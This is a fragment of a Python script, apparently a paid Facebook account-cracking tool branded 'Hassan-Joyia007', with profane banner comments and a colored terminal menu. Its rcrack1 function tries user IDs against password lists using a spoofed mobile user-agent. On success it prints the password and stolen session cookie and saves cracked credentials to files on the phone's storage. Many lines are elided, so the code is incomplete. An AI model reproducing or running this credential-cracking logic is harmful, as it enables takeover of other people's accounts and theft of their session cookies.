#SC MAKED BY Hassan-Joyia007
#Fuck Hassan-Joyia007
#Dec By Hassan-Joyia007
#Hassan-Joyia007 Your Reyal Pappa
#Hassan-Joyia007 Kids Numbar 7
...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO Hassan-Joyia007 TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m Hassan-Joyia007
\033[1;32m[-] GITHUB    :\033[1;32m Hassan-Joyia007
\033[1;32m[-] FACEBOOK  :\033[1;32m Hassan-Joyia007
\033[1;92m══════════════════════════════════════════
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Hassan-Joyia007🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/Hassan-Joyia007/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/Hassan-Joyia007', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Hassan-Joyia007] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
